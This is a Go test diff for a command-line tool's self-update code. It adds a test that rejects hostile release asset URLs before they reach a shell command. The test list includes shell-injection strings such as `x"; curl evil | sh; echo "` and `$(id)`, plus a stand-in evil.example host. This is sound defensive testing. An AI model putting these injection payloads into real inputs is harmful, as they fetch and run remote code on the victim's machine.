@@ -1,6 +1,7 @@
 package health
 
 import (
+	"encoding/json"
 	"strings"
 	"testing"
 )
@@ -124,6 +125,12 @@ func TestNewerReadsTheVersionOutOfADescribe(t *testing.T) {
 	}
 }
 
+// strconvQuote is a JSON string literal.
+func strconvQuote(s string) string {
+	b, _ := json.Marshal(s)
+	return string(b)
+}
+
 const releaseJSON = `{"tag_name":"v0.5.0","name":"remuda 0.5.0","assets":[
  {"name":"remuda-darwin-arm64","browser_download_url":"https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64"},
  {"name":"remuda-linux-amd64","browser_download_url":"https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-linux-amd64"},
@@ -165,9 +172,9 @@ func TestReleaseUpdate(t *testing.T) {
 		t.Fatalf("remote: %+v %v", u, ok)
 	}
 	for _, want := range []string{
-		`curl -fsSL --retry 3 -o "$HOME/.local/bin/remuda.new" "https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64"`,
+		`curl -fsSL --retry 3 -o "$HOME/.local/bin/remuda.new" 'https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64'`,
 		`/v0.5.0/checksums.txt`,
-		`awk -v n="remuda-darwin-arm64"`,
+		`awk -v n='remuda-darwin-arm64'`,
 		`mv "$HOME/.local/bin/remuda.new" "$HOME/.local/bin/remuda"`,
 		`launchctl kickstart -k`,
 	} {
@@ -202,8 +209,23 @@ func TestReleaseUpdate(t *testing.T) {
 	if _, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", Release{}, false); ok {
 		t.Error("no release known, yet offered")
 	}
+	// an asset URL that is not GitHub's for this release is no release: it goes into a shell
+	for _, bad := range []string{
+		`https://evil.example/remuda-darwin-arm64`,
+		`https://github.com/someone/else/releases/download/v0.5.0/remuda-darwin-arm64`,
+		`https://github.com/dev1antdev/remuda/releases/download/v0.4.0/remuda-darwin-arm64`,
+		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/x"; curl evil | sh; echo "`,
+		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/x'; curl evil | sh; echo '`,
+		`http://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64`,
+		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64?x=$(id)`,
+	} {
+		hostile, _ := parseRelease(strings.NewReader(`{"tag_name":"v0.5.0","assets":[{"name":"remuda-darwin-arm64","browser_download_url":` + strconvQuote(bad) + `}]}`))
+		if _, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", hostile, false); ok {
+			t.Errorf("a release with asset URL %q was offered", bad)
+		}
+	}
 	// a release without checksums installs, and says it is not verified
-	old, _ := parseRelease(strings.NewReader(`{"tag_name":"v0.6.0","assets":[{"name":"remuda-darwin-arm64","browser_download_url":"https://x/remuda-darwin-arm64"}]}`))
+	old, _ := parseRelease(strings.NewReader(`{"tag_name":"v0.6.0","assets":[{"name":"remuda-darwin-arm64","browser_download_url":"https://github.com/dev1antdev/remuda/releases/download/v0.6.0/remuda-darwin-arm64"}]}`))
 	n, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", old, false)
 	if !ok || !strings.Contains(n.Command, "not verified") || strings.Contains(n.Command, "awk") || !strings.Contains(n.Note, "no checksums.txt") {
 		t.Fatalf("no checksums: %+v", n)
